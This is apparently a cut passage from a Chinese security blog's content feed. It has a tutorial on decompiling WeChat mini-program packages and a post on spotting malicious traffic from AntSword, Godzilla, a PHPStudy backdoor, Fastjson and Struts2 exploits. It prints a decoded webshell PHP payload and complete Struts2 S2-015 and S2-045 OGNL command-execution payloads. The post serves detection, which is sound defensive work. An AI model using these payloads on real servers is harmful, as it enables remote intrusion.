data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707611974-8ff738b8-bbf1-40be-9066-caaf6a24a4e7.png#height=280&id=VhPg8&originHeight=551&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=613" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>最后把提取出来的文件夹放在微信开发者工具里就可以分析了.     [微信开发者工具下载] (<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html</a>)</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707700826-4d0c9cf0-053f-4048-b79b-41141daeb2e6.png#height=421&id=Qqrju&originHeight=1030&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=641" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12914254/1617707700826-4d0c9cf0-053f-4048-b79b-41141daeb2e6.png#height=421&id=Qqrju&originHeight=1030&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=641" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="DyoZD"></a></p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p><a name="SaFia"></a></p><h3 id="环境工具准备"><a href="#环境工具准备" class="headerlink" title="环境工具准备"></a>环境工具准备</h3><ul><li>node.js 运行环境</li><li>小程序解密脚本</li><li>反编脚本</li><li>微信小程序开发者工具</li></ul><p>以上工具打包分享<br />链接: <a href="https://pan.baidu.com/s/1SE9uNu5Yxwwmbpw1ils0oA?pwd=zzy6">https://pan.baidu.com/s/1SE9uNu5Yxwwmbpw1ils0oA?pwd=zzy6</a> 提取码: zzy6</p><p>下载工具包后进行解压首先安装 node.js 环境，安装完成后通过 cmd 运行 <strong>node -v</strong> 和 <strong>npm -v</strong>查看版本是否安装成功。</p><p>[<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639272861-df46fd3c-f05d-4ce9-a180-f9214905a2b6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639272861-df46fd3c-f05d-4ce9-a180-f9214905a2b6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="w7FTy"></a></p><h3 id="小程序包下载"><a href="#小程序包下载" class="headerlink" title="小程序包下载"></a>小程序包下载</h3><p>PC 端和手机端小程序在运行时会将程序包缓存到本地，但是程序包经过了加密，我们不能够直接进行反编解包，这里我们需要首先对小程序包进行解密后才能够对其进行反编。<br />小程序包的解密首先需要找到小程序包缓存到本地的位置，这里以 PC 端为例不演示手机端。打开微信设置-文件管理，打开下图中的路径找到下图路径中 WeChat Files 文件夹。默认微信缓存文件在系统 C 盘用户文档目录下，我这里微信缓存位置做了修改。<br />[<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639272851-f1e9063f-a9aa-47d7-a9c5-225804733b59.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639272851-f1e9063f-a9aa-47d7-a9c5-225804733b59.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />第二种方法更为简单，我们直接将 Applet 文件夹下的所有小程序缓存包删除掉，再访问一次将要准备反编的小程序，这时 Applet 下就只有这一个小程序的缓存包了，简单粗暴哈哈哈。<br><a name="oOy7j"></a></p><h3 id="小程序包解密"><a href="#小程序包解密" class="headerlink" title="小程序包解密"></a>小程序包解密</h3><p>下面我们就使用小程序包解密工具对包进行解密，解压小程序包解密工具如下图运行 UnpackMiniApp.exe<br />[<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639274132-19e71276-1c64-417d-83b9-cecb828cfacb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639274132-19e71276-1c64-417d-83b9-cecb828cfacb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />解密成功后输出到 wxpack 文件夹下，文件格式不变。<br><a name="obXaU"></a></p><h3 id="小程序包反编译"><a href="#小程序包反编译" class="headerlink" title="小程序包反编译"></a>小程序包反编译</h3><p>经过解密后的的包格式依然是 **.wxapkg **,下一步我们需要对包进行反编译就可以获取小程序的源代码。<br />我们使用中的 <strong>wxappUnpacker</strong> 脚本对其进行反编译。步骤如下：<br />解压 <strong>wxappunpacker</strong> 进入这个目录后在目录下运行 <strong>cmd</strong> 执行命令<br />node wuWxapkg.js D:\小程序包解密\wxpack\wx8f446acf8c4a85f5.wxapkg ## 其中 D:\小程序包解密\wxpack\wx8f446acf8c4a85f5.wxapkg 为解密后的小程序包路径位置 <br />[<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639275679-8d1844a2-4302-4fe5-a7b7-06a0bee71005.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639275679-8d1844a2-4302-4fe5-a7b7-06a0bee71005.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="dsKeo"></a></p><h3 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h3><p>完成解密和反编后我们已经获取到了小程序包的源码，最后我们可以使用微信小程序开发工具进行编辑开发或查看审阅源码。<br />在我分享的工具包中提供了 win64 版本的微信小程序开发工具安装包，如需不同版本的安装包也可自行到微信开发者官方网页进行下载<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html</a><br />安装完成后我们运行工具使用游客模式登录<br />[<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639277278-baf61c10-adeb-4270-83a8-0b70da512c2e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663639277278-baf61c10-adeb-4270-83a8-0b70da512c2e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />我在前面有提到手机端的微信小程序，实际上手机端和 PC 端的小程序包都是相同格式的只要我们找到手机小程序包缓存位置将包导出到电脑中也可进行反编，在 PC 端进行反编相对于从手机提取小程序包要方便一些。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意流量特征分析</title>
      <link href="/2023/06/29/frontend/security/e-yi-liu-liang-te-zheng-fen-xi/"/>
      <url>/2023/06/29/frontend/security/e-yi-liu-liang-te-zheng-fen-xi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="JcLp8"></a></p><h1 id="分析工具："><a href="#分析工具：" class="headerlink" title="分析工具："></a>分析工具：</h1><p>Wireshark,在线解密网站</p><p><a name="4qvXc"></a></p><h1 id="蚁剑的流量特征"><a href="#蚁剑的流量特征" class="headerlink" title="蚁剑的流量特征"></a>蚁剑的流量特征</h1><ul><li>UA：antSword&#x2F;v2.1</li><li>请求数据：key&#x3D;(一段加密的内容)</li><li>返回数据通常为请求数据解密后执行的命令<br><a name="BHpX4"></a></li></ul><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617429543805-ff9df0d4-fc7f-44d3-90cf-fa80d4c59b89.png#height=520&id=sKwJM&originHeight=788&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88503&status=done&style=none&title=&width=565" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617429543805-ff9df0d4-fc7f-44d3-90cf-fa80d4c59b89.png#height=520&id=sKwJM&originHeight=788&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88503&status=done&style=none&title=&width=565" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />如图，根据 HTTP 流分析，UA 为 antSword&#x2F;v2.1,将请求数据进行 URL 解密后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="keyword">echo</span> <span class="string">&quot;0f07cc1a1&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;020ae6da1ca4&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$D</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>)<span class="variable">$D</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>&quot;</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(<span class="title function_ invoke__">range</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> <span class="variable">$L</span>)<span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;&#125;<span class="variable">$R</span>.=<span class="string">&quot;&quot;</span>;<span class="variable">$u</span>=(<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;posix_getegid&quot;</span>))?@<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()):<span class="string">&quot;&quot;</span>;<span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:@<span class="title function_ invoke__">get_current_user</span>();<span class="variable">$R</span>.=<span class="title function_ invoke__">php_uname</span>();<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$s&#125;</span>&quot;</span>;<span class="keyword">echo</span> <span class="variable">$R</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p><a name="0rAFD"></a></p><h1 id="哥斯拉的流量特征"><a href="#哥斯拉的流量特征" class="headerlink" title="哥斯拉的流量特征"></a>哥斯拉的流量特征</h1><ul><li>通常 POST 请求，没有 GET 请求</li><li>大部分 payload 使用 AES 加密，php 使用异或加密</li><li>服务器返回的 Content-Length 为 0</li><li>请求的数据中都含有密码”pass&#x3D;”<br><a name="hkNfV"></a></li></ul><h3 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617434376385-7e33891f-be15-49b5-8b74-a139b1306bae.png#height=451&id=azCJU&originHeight=515&originWidth=476&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36628&status=done&style=none&title=&width=417" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617434376385-7e33891f-be15-49b5-8b74-a139b1306bae.png#height=451&id=azCJU&originHeight=515&originWidth=476&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36628&status=done&style=none&title=&width=417" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />请求包：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617432885975-ab53ae52-cd61-48db-8219-f733f970bdef.png#height=583&id=bdElw&originHeight=902&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197228&status=done&style=none&title=&width=551" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617432885975-ab53ae52-cd61-48db-8219-f733f970bdef.png#height=583&id=bdElw&originHeight=902&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197228&status=done&style=none&title=&width=551" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />返回包：Content-Length:0<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617432951887-4776ebfa-ebaf-4b2e-a342-74f351eebc5d.png#height=169&id=rTDFr&originHeight=213&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22698&status=done&style=none&title=&width=599" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617432951887-4776ebfa-ebaf-4b2e-a342-74f351eebc5d.png#height=169&id=rTDFr&originHeight=213&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22698&status=done&style=none&title=&width=599" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="oYIwx"></a></p><h1 id="PHPstudy-后门的流量特征"><a href="#PHPstudy-后门的流量特征" class="headerlink" title="PHPstudy 后门的流量特征"></a>PHPstudy 后门的流量特征</h1><ul><li>Accept-Charset 字段中有着其不该有的值<br><a name="s5z3W"></a></li></ul><h3 id="实例：-2"><a href="#实例：-2" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617433070896-719de29f-b19b-47fd-a10e-9a404205277a.png#height=349&id=Ekjqn&originHeight=541&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41635&status=done&style=none&title=&width=551" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617433070896-719de29f-b19b-47fd-a10e-9a404205277a.png#height=349&id=Ekjqn&originHeight=541&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41635&status=done&style=none&title=&width=551" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />Accpet-Charset 字段中的内容：<br /><code>c3lzdGVtKCJuZXQgdXNlciIpOw==</code><br />Base64 解密后：<br /><code>system(&quot;net user&quot;);</code><br />返回包的数据：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617545340644-bfde3847-371a-470c-a38e-ff41644b8176.png#height=242&id=xv0f7&originHeight=281&originWidth=677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15195&status=done&style=none&title=&width=583" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617545340644-bfde3847-371a-470c-a38e-ff41644b8176.png#height=242&id=xv0f7&originHeight=281&originWidth=677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15195&status=done&style=none&title=&width=583" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="hMHo3"></a></p><h1 id="Fastjson-反序列化漏洞的流量特征"><a href="#Fastjson-反序列化漏洞的流量特征" class="headerlink" title="Fastjson 反序列化漏洞的流量特征"></a>Fastjson 反序列化漏洞的流量特征</h1><p><a name="SaDB5"></a></p><h2 id="Fastjson-1-2-24-反序列化漏洞"><a href="#Fastjson-1-2-24-反序列化漏洞" class="headerlink" title="Fastjson 1.2.24 反序列化漏洞"></a>Fastjson 1.2.24 反序列化漏洞</h2><ul><li>特征为请求数据中含有”@type”字段</li><li>原理:Fastjson 在处理以@type 形式传入的类时，会默认调用该类的共有 set\get\is 函数<br><a name="x6NfN"></a></li></ul><h3 id="实例：-3"><a href="#实例：-3" class="headerlink" title="实例："></a>实例：</h3><p><a name="yfyPA"></a></p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617543847310-dd97f5ec-197e-462b-83c8-8936186b772b.png#height=453&id=enXuD&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83989&status=done&style=none&title=&width=565" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617543847310-dd97f5ec-197e-462b-83c8-8936186b772b.png#height=453&id=enXuD&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83989&status=done&style=none&title=&width=565" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></h3><p><a name="tLFvT"></a></p><h2 id="Fastjson-lt-x3D-1-2-47-反序列化漏洞"><a href="#Fastjson-lt-x3D-1-2-47-反序列化漏洞" class="headerlink" title="Fastjson &lt;&#x3D;1.2.47 反序列化漏洞"></a>Fastjson &lt;&#x3D;1.2.47 反序列化漏洞</h2><ul><li>特征为请求数据中含有”@type”:”java.lang.Class”字段</li><li>原理：利用@type 加载 dedserializers 中的 java.lang.class 类，里面传参要添加的类，从而调用 TypeUtils.loadClass()类来添加 com.sun.rowset.jdbcRowSetlmpl 类到 mapping 函数里，最后实现调用@type 的值<br><a name="slwUv"></a></li></ul><h3 id="实例：-4"><a href="#实例：-4" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617430392122-cbef956a-38fb-498e-aba2-9fe330d6cd65.png#height=606&id=yYmyL&originHeight=903&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=574" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617430392122-cbef956a-38fb-498e-aba2-9fe330d6cd65.png#height=606&id=yYmyL&originHeight=903&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=574" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="rf6aM"></a></p><h1 id="Structs2-漏洞的流量特征"><a href="#Structs2-漏洞的流量特征" class="headerlink" title="Structs2 漏洞的流量特征"></a>Structs2 漏洞的流量特征</h1><p><a name="SXdxX"></a></p><h2 id="Structs-S2-015-远程代码执行漏洞"><a href="#Structs-S2-015-远程代码执行漏洞" class="headerlink" title="Structs S2-015 远程代码执行漏洞"></a>Structs S2-015 远程代码执行漏洞</h2><ul><li>payload 后面加上了.action</li><li>远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断 OGNL 代码两次）的请求，利用该漏洞执行任意 OGNL 代码。<br><a name="wwkjf"></a></li></ul><h3 id="实例：-5"><a href="#实例：-5" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617544543930-64ac7162-db98-401f-8d78-5e0f401315b4.png#height=608&id=bMA4b&originHeight=900&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111313&status=done&style=none&title=&width=578" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617544543930-64ac7162-db98-401f-8d78-5e0f401315b4.png#height=608&id=bMA4b&originHeight=900&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111313&status=done&style=none&title=&width=578" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/S2-015/%24%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23m%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2c%23m.setAccessible(true)%2c%23m.set(%23_memberAccess%2ctrue)%2c%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream())%2c%23q%7d.action</span><br></pre></td></tr></table></figure><p>URL 解码后的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>,#q&#125;.action</span><br></pre></td></tr></table></figure><p>可以看到回显中被执行的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid%3D0%28root%29%20gid%3D0%28root%29%20groups%3D0%28root%29%0A.jsp</span><br></pre></td></tr></table></figure><p>URL 解码后的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">.jsp</span><br></pre></td></tr></table></figure><p>命令执行成功<br><a name="UK2eW"></a></p><h2 id="Structs-S2-045-远程代码执行漏洞"><a href="#Structs-S2-045-远程代码执行漏洞" class="headerlink" title="Structs S2-045 远程代码执行漏洞"></a>Structs S2-045 远程代码执行漏洞</h2><ul><li>该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息，导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。</li><li>payload 在 content-type 中<br><a name="7FJCn"></a></li></ul><h3 id="实例：-6"><a href="#实例：-6" class="headerlink" title="实例："></a>实例：</h3><p><a name="HiIhV"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617545998738-8b0fc3c3-7839-4ec6-a4c7-bc2a1236f4e2.png#height=454&id=uaEJg&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93867&status=done&style=none&title=&width=566" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617545998738-8b0fc3c3-7839-4ec6-a4c7-bc2a1236f4e2.png#height=454&id=uaEJg&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93867&status=done&style=none&title=&width=566" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></h3><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nike=<span class="string">&#x27;multipart/form-data&#x27;</span>).(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;whoami&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p>执行的命令：<code>whoami</code><br />回显的内容：<br /><img 